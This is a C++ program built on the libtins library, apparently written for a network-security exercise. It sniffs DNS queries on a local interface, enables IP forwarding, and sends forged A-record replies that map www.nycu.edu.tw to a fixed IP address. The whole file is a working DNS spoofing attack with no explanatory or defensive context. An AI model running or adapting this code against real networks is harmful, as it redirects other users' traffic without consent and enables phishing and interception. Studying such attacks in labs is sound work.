#include <tins/tins.h>
#include <iostream>
#include <stdlib.h>

using namespace Tins;

PacketSender sender;
std::string server = "140.113.24.241";
std::string domain = "www.nycu.edu.tw";

bool response(const PDU& pdu) {
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();
    if (dns.type() == DNS::QUERY) {
        for (const auto& q : dns.queries()) {
            if (q.query_type() == DNS::A && q.dname() == domain) {
                dns.add_answer(
                    DNS::resource(
                        q.dname(), 
                        server,
                        DNS::A, 
                        q.query_class(), 
                        777
                    )
                );
            }
        }
        if (dns.answers_count() > 0) {
            dns.type(DNS::RESPONSE);
            dns.recursion_available(1);
            auto pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                       IP(ip.src_addr(), ip.dst_addr()) /
                       UDP(udp.sport(), udp.dport()) /
                       dns;
            sender.send(pkt);
        }
    }
    return true;
}

int main(int argc, char* argv[]) {
        system("sysctl -w net.ipv4.ip_forward=1");
        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_immediate_mode(true);
        config.set_filter("udp and dst port 53");
        Sniffer sniffer("ens33", config);
        sender.default_interface("ens33");
        sniffer.sniff_loop(response);
}